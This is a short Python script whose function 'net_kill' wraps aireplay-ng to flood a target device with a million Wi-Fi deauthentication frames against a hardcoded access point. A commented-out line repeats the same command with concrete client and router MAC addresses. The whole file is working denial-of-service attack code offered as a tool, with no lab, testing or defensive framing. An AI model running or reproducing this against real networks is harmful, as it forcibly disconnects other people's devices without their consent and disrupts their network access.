import subprocess

def net_kill(target_mac):
    # cmd = 'aireplay-ng --deauth 1000000 -c E0:91:67:F8:0D:BD -a 70:0B:01:EC:52:F1 wlan0'
    cmd = f'aireplay-ng --deauth 1000000 -c {target_mac} -a 70:0B:01:EC:52:F1 wlan1'

    process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE)
    output, error = process.communicate()

    print(output)
    print(error)


